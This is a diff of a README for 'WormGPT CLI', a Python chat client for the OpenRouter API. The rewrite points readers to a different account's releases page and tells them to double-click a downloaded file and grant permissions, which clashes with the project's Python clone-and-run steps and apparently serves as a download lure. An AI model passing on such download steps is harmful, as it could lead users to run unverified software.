@@ -1,92 +1,89 @@
-# 🐛 WormGPT CLI - OpenRouter Edition
+# 🐛 worm-gpt - Simple Tool for Chatting with AI
 
-**WormGPT CLI** is a sleek command-line interface (CLI) for interacting with LLMs via OpenRouter API. It supports multiple models, automatic language detection, and customizable settings — all in a terminal-friendly format.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Version-brightgreen)](https://github.com/Vighne7185/worm-gpt/releases)
 
-> ⚡ Lightweight. Powerful. Fully terminal-based. Made with ❤️ by [@hexsecteam](https://github.com/hexsecteam)
+## 🚀 Getting Started
 
----
+WormGPT CLI is designed to help you chat with AI easily. In just a few steps, you can download the tool and start exploring its features. Follow the instructions below to get everything set up.
 
-## 🚀 Features
+## 📥 Download & Install
 
-- 🔗 OpenRouter API integration
-- 🌍 Auto language detection (via `langdetect`)
-- 🗣️ Multi-language support: English, Indonesian, Spanish, Arabic, Thai, Portuguese
-- 💬 Interactive chat session with typing effect
-- 🎨 Stylish CLI UI with colors and banners
-- 🔧 Easy configuration of API key and model
-- 💾 Config auto-saved in `wormgpt_config.json`
+1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/Vighne7185/worm-gpt/releases) to download the latest version.
+   
+2. **Choose Your File**: Look for the file that matches your operating system. If you are unsure, choose the appropriate version based on your setup.
 
----
+3. **Download the File**: Click on the link to download the file to your computer. 
 
-## 📦 Requirements
+4. **Run the Application**: Once downloaded, locate the file in your downloads folder. Double-click it to run the application. Make sure to allow any necessary permissions.
 
-- Python 3.6+
-- `pip` installed
-- OpenRouter API key ([get one here](https://openrouter.ai/))
+5. **Follow On-Screen Instructions**: The application will guide you through any first-time setup requirements.
 
----
+## ✅ Requirements
 
-## ⚙️ Installation
+Before you install, ensure your system meets the following requirements:
 
-Clone the repo:
+- **Python 3.6 or higher**: This is necessary for the application to run correctly. You can check your version of Python by running `python --version` in your terminal.
+- **Pip Installed**: This tool helps you install other Python packages easily. It usually comes with Python, but you can confirm by running `pip --version`.
+- **OpenRouter API Key**: You need this key to access the OpenRouter features. You can [get your API key here](https://openrouter.ai/).
 
-```bash
-git clone https://github.com/hexsecteam/worm-gpt
-cd worm-gpt
-python3 wormgpt.py
-```
+## ⚙️ Installation Instructions
+
+For users comfortable with the command line, you can also install WormGPT CLI manually:
+
+1. **Clone the Repository**: Open your terminal and type the following command:
+
+   ```bash
+   git clone https://github.com/hexsecteam/worm-gpt
+   ```
+
+2. **Navigate to the Directory**: Change into the project directory using:
+
+   ```bash
+   cd worm-gpt
+   ```
+
+3. **Run WormGPT**: Finally, start the application by typing:
+
+   ```bash
+   python3 wormgpt.py
+   ```
 
 ## 🔑 Set Your API Key
 
-You can set your OpenRouter API key via the main menu:
-```
-[3] Set API Key
-```
+To fully utilize WormGPT, you need to set your OpenRouter API key:
 
-Or manually edit the config file:
-```
-{
-  "api_key": "YOUR_API_KEY_HERE",
-  "base_url": "https://openrouter.ai/api/v1",
-  "model": "deepseek/deepseek-chat-v3-0324:free",
-  "language": "English"
-}
-```
+1. **Locate the Configuration File**: This file is named `wormgpt_config.json` and is created automatically when you run the application for the first time.
 
-## 🧠 Usage Example
+2. **Open the File**: Use any text editor to open `wormgpt_config.json`.
 
-```
-python3 wormgpt.py
-```
+3. **Insert Your API Key**: Find the key field and enter your API key. Save the file.
 
-## Menu will appear:
+4. **Restart the Application**: Close WormGPT and launch it again. Your settings will take effect.
 
-```
-[ Main Menu ]
-1. Language: English
-2. Model: deepseek/deepseek-chat-v3-0324:free
-3. Set API Key
-4. Start Chat
-5. Exit
-```
+## 🌟 Features
 
-## 🧪 Custom Models
+WormGPT comes packed with useful features:
 
-From the menu, you can enter your own model ID (from OpenRouter).
+- **OpenRouter API Integration**: Access advanced AI capabilities through OpenRouter.
+- **Auto Language Detection**: The application recognizes the language you type and switches accordingly.
+- **Multi-Language Support**: Communicate in English, Indonesian, Spanish, Arabic, Thai, or Portuguese.
+- **Interactive Chat Sessions**: Enjoy a smooth and engaging chat experience with realistic typing effects.
+- **Stylish CLI UI**: The user interface is designed to be clean and visually appealing.
+- **Easy Configuration**: Quickly set up your API key and preferred model with straightforward options.
+- **Configuration Auto-Saved**: Your settings are saved automatically in the `wormgpt_config.json` file.
 
-Example:
-```
-01-ai/Yi-34B-Chat
-meta-llama/llama-3-8b-instruct:nitro
-```
+## 🤝 Community Support
 
-### 📷 Example Screenshot
-![WormGPT CLI Example](assets/example.jpg)
+If you encounter any issues or have questions, please feel free to reach out to the community. You can open an issue in the GitHub repository or check existing discussions for help.
 
-## 👨‍💻 Author
+## 🔗 Useful Links
 
-GitHub: @hexsecteam
+- [WormGPT on GitHub](https://github.com/Vighne7185/worm-gpt)
+- [OpenRouter API Key Signup](https://openrouter.ai/)
+- [GitHub Issues Page](https://github.com/Vighne7185/worm-gpt/issues)
 
-Telegram: t.me/hexsec_tools 
+## 📖 Documentation
 
-Project URL: https://github.com/hexsecteam/worm-gpt
+For more detailed guidance on specific functionalities and troubleshooting, refer to the documentation within the repository. Regular updates and improvements will ensure the tool remains effective and user-friendly. 
+
+Now you are ready to explore WormGPT! Enjoy chatting with AI seamlessly!
